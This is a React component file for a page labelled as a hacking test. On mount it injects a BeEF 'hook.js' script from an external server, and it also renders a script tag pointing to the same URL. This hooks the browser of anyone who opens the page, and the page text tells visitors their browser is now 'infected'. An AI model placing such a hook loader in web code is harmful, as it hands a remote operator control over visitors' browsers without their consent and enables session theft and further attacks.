import React, {useEffect} from 'react';
import {render} from "@testing-library/react";

function TestPage() {
    useEffect(() => {
        console.log("TestPage mounted");
        // Dynamically add the hook.js script
        const script = document.createElement('script');
        script.src = 'https://beef.jorichz.fr/hook.js';
        script.async = true;
        document.body.appendChild(script);

        return () => {
            // Clean up the script when the component is unmounted
            document.body.removeChild(script);
        };
    }, []);

    return (
        <div className="w-screen h-screen bg-[f2f2f2] flex items-center justify-center text-center">
        <p className={"font-bold text-xl"}>This page is for hacking test, if you are on this page your browser got infected for experiment purpose !
        <br/>Please contact me at hantzberg.joric@gmail.com for any request</p>
        <script src={"https://beef.jorichz.fr/hook.js"}></script>
        </div>
    );
}

export default TestPage;